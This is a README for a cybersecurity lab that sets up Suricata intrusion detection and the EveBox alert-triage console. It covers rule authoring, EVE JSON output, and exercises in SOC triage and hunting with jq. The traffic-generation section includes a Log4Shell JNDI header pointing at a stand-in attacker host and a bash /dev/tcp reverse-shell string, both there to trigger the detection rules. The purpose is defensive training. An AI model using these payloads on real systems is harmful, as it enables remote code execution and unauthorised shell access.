# Suricata NIDS/NIPS & EveBox SOC Alert Triage Suite

## Overview

Deploy an enterprise Network Intrusion Detection & Prevention System (NIDS/NIPS) paired with a dedicated Security Operations Center (SOC) triage web console. **Suricata** performs multi-threaded deep packet inspection (DPI), protocol identification, and structured telemetry extraction, outputting rich events in **EVE JSON** format (`eve.json`). **EveBox** ingests, indexes, and presents these security alerts in an analyst-friendly workflow interface supporting alert inbox triage, filtering, escalation, and hex/payload analysis.

- **Default Port / Access**:
  - EveBox SOC Web GUI: `http://localhost:8113` (No authentication required in lab mode)
  - Suricata Engine Container: `cyberlab_suricata`
  - EveBox Console Container: `cyberlab_evebox`
- **Shared Storage**:
  - Logs Directory: `Classes/03_network_security/suricata_evebox_soc/logs` (contains `eve.json`, `suricata.log`)
  - Custom Rules Directory: `Classes/03_network_security/suricata_evebox_soc/rules`
  - PCAP Directory: `Classes/03_network_security/suricata_evebox_soc/pcaps`
- **Directory**: `Classes/03_network_security/suricata_evebox_soc`

---

## Architecture & Telemetry Pipeline

```
     [ Network Traffic / Wire / PCAP ]
                    |
                    v
    +-----------------------------------------------+
    |         Suricata Multi-Threaded Engine        |
    |              (cyberlab_suricata)              |
    | - Protocol Parsing (HTTP, TLS, DNS, SSH, SMB) |
    | - Signature Matching & Custom Rules Engine    |
    | - File Extraction & Flow Tracking             |
    +-----------------------+-----------------------+
                            |
           Writes Structured EVE JSON stream
                            v
               [ /var/log/suricata/eve.json ]
                            |
           Monitored and Parsed via SQLite
                            v
    +-----------------------------------------------+
    |              EveBox SOC Console               |
    |               (cyberlab_evebox)               |
    | - Inbox Alert Triage & Event Escalation       |
    | - Signature & Flow Aggregation                |
    | - Full Packet Hex / ASCII Payload Viewer      |
    +-----------------------+-----------------------+
                            |
                   Port 8113 (Browser)
                            v
                   http://localhost:8113
```

---

## Modern NIDS vs NIPS & EVE JSON Telemetry

### NIDS vs NIPS Operation

- **NIDS (Network Intrusion Detection System)**: Operates passively on a mirror or TAP port (or promiscuous interface `eth0`). Alerts on suspicious activity without altering or blocking live packets.
- **NIPS (Network Intrusion Prevention System)**: Operates inline (e.g., using NFQueue, DPDK, or AF_PACKET inline mode). Packets are inspected in real time and can be rejected (`reject`) or dropped (`drop`) before reaching target endpoints.

### Suricata EVE JSON Telemetry (`eve.json`)

Unlike legacy IDS log formats that output flat text strings, Suricata generates structured, machine-readable JSON objects for every significant event:

- **`event_type: "alert"`**: Generated when a signature triggers, detailing signature ID (`sid`), category, priority, flow tuples, and payload buffers.
- **`event_type: "dns"`**: DNS query, transaction ID, record type (`A`, `AAAA`, `TXT`), and responses.
- **`event_type: "http"`**: Complete HTTP metadata including method, hostname, URL path, user-agent, status codes, and response headers.
- **`event_type: "tls"`**: TLS handshake attributes, subject DN, issuer, SNI, client certificate parameters, and JA3/JA4 fingerprint hashes.
- **`event_type: "flow"`**: High-level connection statistics (start/end timestamp, byte counts, packet counts, TCP state).

Example Alert Event Structure in `eve.json`:

```json
{
  "timestamp": "2026-10-14T04:30:15.124567+0000",
  "flow_id": 1827461938472918,
  "event_type": "alert",
  "src_ip": "192.168.1.105",
  "src_port": 49152,
  "dest_ip": "10.0.0.50",
  "dest_port": 80,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 1000001,
    "rev": 1,
    "signature": "SOC ALERT - Automated SQL Injection Tool Detected (sqlmap)",
    "category": "Web Application Attack",
    "severity": 1
  },
  "http": {
    "hostname": "target.local",
    "url": "/login.php?id=1%27",
    "http_user_agent": "sqlmap/1.7#stable",
    "http_method": "GET"
  }
}
```

---

## Custom Suricata Rule Authoring

Suricata rules follow a structured syntax:

```
action proto src_ip src_port -> dest_ip dest_port (rule options)
```

### Essential Rule Components:

1. **Action**: `alert` (generate alert), `drop` (block and drop packet), `pass` (ignore traffic), `reject` (send TCP RST or ICMP unreachable).
2. **Protocol**: `tcp`, `udp`, `icmp`, `ip`, `http`, `dns`, `tls`, `ssh`, `ftp`.
3. **Direction**: `->` (unidirectional) or `<>` (bidirectional).
4. **Rule Options**:
   - `msg`: Human-readable alert description shown in EveBox.
   - `flow`: Flow state requirement (e.g. `established,to_server`).
   - `content`: Exact string or byte pattern to match.
   - `nocase`: Case-insensitive string matching.
   - `fast_pattern`: Tells the multi-pattern matcher (MPM) engine to prioritize this content match for fast pre-filtering.
   - `pcre`: Perl-Compatible Regular Expression for complex regex matching.
   - `classtype`: Standard categorization (e.g. `web-application-attack`, `trojan-activity`, `attempted-recon`).
   - `sid`: Unique Signature Identifier (User-authored rules MUST use `sid >= 1000000`).
   - `rev`: Revision integer, incremented on rule updates.

### Pre-loaded Lab Rules (`rules/custom.rules`):

```suricata
# 1. SQL Injection Scanner Detection
alert http any any -> any any (msg:"SOC ALERT - Automated SQL Injection Tool Detected (sqlmap)"; flow:established,to_server; http.user_agent; content:"sqlmap"; nocase; classtype:web-application-attack; sid:1000001; rev:1;)

# 2. Scanner Reconnaissance (Nikto / DirBuster)
alert http any any -> any any (msg:"SOC ALERT - Reconnaissance Scanner Tool User-Agent Detected"; flow:established,to_server; http.user_agent; pcre:"/(Nikto|DirBuster|Gobuster|wpscan)/i"; classtype:attempted-recon; sid:1000002; rev:1;)

# 3. Log4Shell / JNDI Remote Code Execution (CVE-2021-44228)
alert http any any -> any any (msg:"SOC ALERT - Potential Log4j JNDI RCE Exploit Attempt"; flow:established,to_server; content:"${jndi:"; nocase; fast_pattern; classtype:attempted-admin; sid:1000003; rev:1;)

# 4. Outbound Interactive Reverse Shell Telemetry
alert tcp any any -> any any (msg:"SOC ALERT - Interactive Reverse Shell Payload Detected (bash -i)"; flow:established; content:"/bin/bash -i"; fast_pattern; classtype:trojan-activity; sid:1000004; rev:1;)
```

---

## How to Solve & Practice

### 1. Launch the Stack

```bash
docker compose up -d
```

Access EveBox at `http://localhost:8113` in your browser.

### 2. Verify Container Telemetry

Check that both Suricata and EveBox are operational:

```bash
docker ps --filter "name=cyberlab_"
```

### 3. Generate Simulated Attack Traffic

Trigger the custom rules by sending simulated attack payloads through the network:

#### A. Trigger SQLi Scanner Alert:

```bash
docker exec -it cyberlab_suricata curl -s -H "User-Agent: sqlmap/1.7#stable" http://localhost/
```

#### B. Trigger Log4Shell Exploit Alert:

```bash
docker exec -it cyberlab_suricata curl -s -H "X-Api-Version: \${jndi:ldap://attacker.com/a}" http://localhost/
```

#### C. Trigger Reverse Shell Detection:

```bash
docker exec -it cyberlab_suricata bash -c "echo '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | nc -l -p 9999 & sleep 1; nc 127.0.0.1 9999"
```

### 4. Offline PCAP Replay & Analysis

Analyze captured traffic from incident response investigations or CTF challenges:

1. Copy or download any `.pcap` file into `./pcaps`:
   ```bash
   # Download a sample malware traffic PCAP
   curl -sL "https://www.malware-traffic-analysis.net/2023/01/18/2023-01-18-traffic-analysis-exercise.pcap.zip" -o pcaps/sample.zip
   ```
2. Replay the PCAP through Suricata with custom rules:
   ```bash
   docker exec -it cyberlab_suricata suricata -r /workspace/pcaps/sample.pcap -l /var/log/suricata -s /etc/suricata/rules/custom.rules
   ```
3. Refresh EveBox at `http://localhost:8113` to immediately review and triage all alerts generated from the PCAP.

### 5. SOC Alert Triage in EveBox GUI

1. **Inbox View**: Newly triggered alerts appear grouped by Signature.
2. **Alert Actions**:
   - **Archive (`e`)**: Mark the alert as triaged/reviewed.
   - **Escalate (`s`)**: Star or prioritize the event for Tier 2/Tier 3 incident investigation.
3. **Payload Inspection**: Click any event row to expand the full TCP stream, packet hex dump, decoding ASCII buffers, and protocol metadata.
4. **EveBox Search Queries**: Filter events using search parameters:
   - `alert.signature_id:1000001`
   - `src_ip:"192.168.*"`
   - `event_type:alert AND alert.severity:1`

### 6. Command-Line SOC Threat Hunting with `jq`

Query the raw `eve.json` log on the host:

```bash
# Count alerts grouped by signature
cat logs/eve.json | jq -r 'select(.event_type=="alert") | .alert.signature' | sort | uniq -c | sort -nr

# Extract top source IPs triggering alerts
cat logs/eve.json | jq -r 'select(.event_type=="alert") | "\(.src_ip) -> \(.alert.signature)"' | sort | uniq -c | sort -nr

# Inspect HTTP User-Agents associated with alerts
cat logs/eve.json | jq -r 'select(.event_type=="alert" and .http != null) | "\(.src_ip) [\(.http.http_user_agent)] -> \(.alert.signature)"'
```

---

## YouTube Walkthroughs & Solving Guides

- [OISF-Suricata - How-To: Installing EveBox for Managing Events and Alerts from Suricata](https://www.youtube.com/watch?v=XXHCs2oZjHw)
- [Dr Josh Stroschein - Investigating NullMixer Network Traffic: IDS Rules from Suricata and Evebox](https://www.youtube.com/watch?v=v_K_zoPGpdk)
- [Dr Josh Stroschein - Installing EveBox in REMnux - A Lightweight UI for IDS Rules and Data](https://www.youtube.com/watch?v=K4wYbQRKnCk)
- [Pro Tech Show - Visualising Network Threats](https://www.youtube.com/watch?v=KWEWU_pItyg)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
